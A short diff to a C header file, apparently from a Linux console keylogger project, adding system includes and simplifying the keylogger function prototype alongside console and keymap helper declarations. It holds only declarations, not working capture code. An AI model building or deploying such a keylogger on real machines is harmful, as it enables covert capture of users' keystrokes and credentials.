@@ -13,6 +13,16 @@
 #ifndef MAIN_H
 # define MAIN_H
 
+# include <stdlib.h>
+# include <stdio.h>
+# include <sys/types.h>
+# include <sys/stat.h>
+# include <fcntl.h>
+# include <unistd.h>
+# include <sys/ioctl.h>
+# include <linux/kd.h>
+# include <errno.h>
+# include <string.h>
 # include <linux/keyboard.h>
 
 # ifndef MAX_NR_KEYMAPS
@@ -23,6 +33,6 @@ int				get_console();
 int				get_keymaps(int, int **);
 int				**get_keys(int, int, int, int **);
 char			*get_keyboard();
-void			keylogger(int keybd, int **key_table, int capslock, int numlock);
+void			keylogger(int, int **);
 
 #endif
